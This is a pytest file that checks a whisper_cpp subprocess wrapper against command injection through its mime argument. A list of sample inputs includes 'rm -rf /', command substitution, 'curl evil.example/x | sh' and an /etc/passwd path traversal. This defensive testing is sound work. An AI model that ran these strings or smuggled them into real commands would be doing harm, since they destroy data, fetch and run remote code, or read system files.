"""Command injection: docs/strides_testing.md's Injection vocabulary
entry names whisper_cpp's subprocess wrapper directly. These tests
exercise glc.voice.stt.providers.whisper_cpp.wrapper.run_whisper_cpp()
itself (not the mocked adapter test_whisper_cpp.py uses), asserting the
actual argv construction stays injection-safe regardless of what a
caller passes as `mime`, and that the mime allowlist added alongside
these tests rejects anything not explicitly recognized instead of
silently defaulting.
"""

from __future__ import annotations

import subprocess

import pytest

from glc.voice.stt.providers.whisper_cpp import wrapper


@pytest.fixture(autouse=True)
def _fake_binary_and_model(monkeypatch, tmp_path):
    monkeypatch.setattr(wrapper.shutil, "which", lambda name: "/usr/bin/whisper-cli")
    model = tmp_path / "ggml-base.bin"
    model.write_bytes(b"fake-model")
    monkeypatch.setattr(wrapper, "MODEL_FILE", model)


@pytest.fixture
def captured_run(monkeypatch):
    """Replaces subprocess.run with one that records its call and
    returns a canned, well-formed CompletedProcess -- no real
    whisper-cli binary is exercised, only the argv construction."""
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append({"cmd": cmd, "kwargs": kwargs})
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(wrapper.subprocess, "run", fake_run)
    return calls


MALICIOUS_MIMES = [
    "audio/wav; rm -rf /",
    "audio/wav`touch /tmp/pwned`",
    "audio/wav$(whoami)",
    "audio/wav\nrm -rf /",
    "audio/wav && curl evil.example/x | sh",
    "../../../etc/passwd",
]


@pytest.mark.parametrize("mime", MALICIOUS_MIMES)
def test_malicious_mime_is_rejected_outright(mime, captured_run):
    """None of these are legitimate mime strings -- the allowlist added
    alongside this test rejects them before any subprocess is spawned,
    which is a stronger guarantee than "the shell wouldn't have
    interpreted them anyway" below."""
    with pytest.raises(ValueError, match="unsupported mime type"):
        wrapper.run_whisper_cpp(b"AUDIO", mime)
    assert captured_run == [], "no subprocess should be spawned for a rejected mime"


@pytest.mark.parametrize("mime", ["audio/wav", "audio/raw", "audio/pcm"])
def test_recognized_mime_builds_a_safe_list_form_command(mime, captured_run):
    wrapper.run_whisper_cpp(b"AUDIO BYTES", mime)
    assert len(captured_run) == 1
    call = captured_run[0]

    cmd = call["cmd"]
    assert isinstance(cmd, list), "argv must be a list, not a single interpolated string a shell would re-parse"
    assert all(isinstance(part, str) for part in cmd), "every argv element must be a plain string, never bytes/other"
    is_shell = call["kwargs"].get("shell")
    assert is_shell is not True, "subprocess.run must never be invoked through a shell"


def test_even_a_maliciously_crafted_recognized_mime_cannot_smuggle_extra_argv():
    """Guards against a subtler bug than the outright-rejected cases
    above: even if a future change widened the allowlist to accept a
    caller-influenced string directly as a mime key (instead of a fixed
    dict lookup), the value used to build argv is the *dict's own*
    suffix (".wav"/".bin"), never the caller's string itself -- so
    there's no path from `mime`'s contents into the command line at
    all, only into an internal decision of which one of two fixed
    literals to use."""
    assert set(wrapper._MIME_TO_SUFFIX.values()) == {".wav", ".bin"}
    for mime, suffix in wrapper._MIME_TO_SUFFIX.items():
        assert suffix in (".wav", ".bin")
